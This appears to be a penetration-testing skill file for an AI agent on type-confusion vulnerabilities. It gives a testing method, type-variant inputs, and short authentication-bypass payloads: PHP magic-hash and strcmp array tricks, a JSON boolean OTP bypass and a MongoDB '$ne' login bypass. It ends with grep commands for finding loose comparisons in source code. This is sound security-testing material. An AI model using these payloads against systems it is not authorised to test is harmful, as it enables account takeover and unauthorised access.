---
name: type-confusion-testing
description: "Exploit type confusion vulnerabilities where applications receive unexpected data types (array instead of string, null instead of integer, object instead of scalar). Use when testing parameter handling, auth bypasses, or input validation across PHP, Ruby, JS, Python, Java, and Go."
---

# Type Confusion Testing

Applications assume parameters arrive as specific types. When they don't, security checks fail, queries change shape, and comparisons produce unexpected results.

## Core Concept

```
Developer expects: email=user@example.com  (string)
Attacker sends:    email[]=user@example.com&email[]=attacker@example.com  (array)

Developer expects: admin=false  (boolean)
Attacker sends:    admin=1  (integer that coerces to true)
```

## Testing Methodology

### Step 1: Identify Target Parameters

Focus on parameters that control authentication, authorization, business logic, and data retrieval.

### Step 2: Send Type Variants

| Original Type | Test With | Query String | JSON |
|--------------|-----------|-------------|------|
| String | Array | `param[]=value` | `{"param": ["value"]}` |
| String | Integer | `param=0` | `{"param": 0}` |
| String | Boolean | `param=true` | `{"param": true}` |
| String | Null | `param=` | `{"param": null}` |
| String | Object | `param[key]=value` | `{"param": {"key": "value"}}` |
| Integer | Negative | `param=-1` | `{"param": -1}` |
| Integer | Zero | `param=0` | `{"param": 0}` |
| Integer | Large | `param=99999999999` | `{"param": 99999999999}` |
| Any | Mixed array | N/A | `{"param": [1, "a", null, true]}` |

### Step 3: Analyze Responses

| Response | Signal |
|----------|--------|
| 500 / stack trace | Type not handled -- info leak, potential DoS |
| Different status code | Type influences control flow |
| Different body length | Type changes query results |
| Same 200 as valid input | Type confusion may have bypassed validation |

### Step 4: Exploit

Determine what security check was bypassed, craft payload for impact, document the chain.

## Techniques by Language

See [references/language-techniques.md](references/language-techniques.md) for detailed exploitation techniques across PHP, Ruby, JavaScript, Python, Java, and Go.

### Quick Hits

**PHP magic hash bypass (password/token comparison):**
```php
// if ($user_hash == $input_hash) — loose comparison
// MD5("240610708")  = "0e462097431906509019562988736854"
// MD5("QNKCDZO")   = "0e830400451993494058024219903391"
// Both == 0 in loose comparison
```

**PHP array injection:**
```php
// strcmp(array, string) returns NULL; NULL == 0 → true → auth bypass
// password[]=anything bypasses strcmp($password, $stored) == 0
```

**JSON boolean bypass:**
```json
{"otp": true}
// if compared with == in PHP: true == "123456" → true → OTP bypass
```

**NoSQL injection via type:**
```json
{"username": "admin", "password": {"$ne": ""}}
// MongoDB: password != "" → always true → auth bypass
```

## Detection in Source Code

```bash
# PHP loose comparisons
grep -rn ' == ' --include="*.php" | grep -v '==='
grep -rn 'strcmp\|in_array\|array_search' --include="*.php" | grep -v 'true)'

# JavaScript loose equality
grep -rn ' == ' --include="*.js" | grep -v '==='

# Python truthy checks on user input
grep -rn "if.*\.get\(" --include="*.py"
```

## Related Skills

- **libmagic-type-confusion** -- File MIME type confusion
- **auth-matrix-testing** -- Type confusion as IDOR/auth bypass vector
- **parser-differential-bypass** -- Type interpretation differs between layers
- **orm-filter-data-leak** -- NoSQL operator injection via type confusion
- **custom-sanitizer-audit** -- Sanitizers that assume string input
